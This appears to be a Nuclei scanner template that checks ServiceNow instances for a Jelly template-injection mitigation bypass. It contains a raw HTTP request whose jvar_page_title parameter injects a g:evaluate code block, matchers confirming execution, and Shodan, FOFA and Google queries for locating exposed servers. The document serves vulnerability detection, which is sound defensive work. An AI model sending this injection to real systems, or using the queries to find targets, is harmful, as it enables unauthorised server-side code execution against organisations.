id: servicenow-ssti

info:
  name: Service Now - Template Injection Mitigation Bypass
  author: DhiyaneshDk
  severity: high
  reference:
    - https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data
  classification:
    cpe: cpe:2.3:a:servicenow:servicenow:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: servicenow
    product: servicenow
    shodan-query:
      - http.favicon.hash:1701804003
      - http.title:"servicenow"
    fofa-query:
      - icon_hash=1701804003
      - title="servicenow"
    google-query: intitle:"servicenow"
  tags: cve,cve2024,servicenow,ssti

http:
  - raw:
      - |
        GET /login.do?jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(7*7);</g:evaluate></j:jelly></style> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<div class="outputmsg_text">49</div>'

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
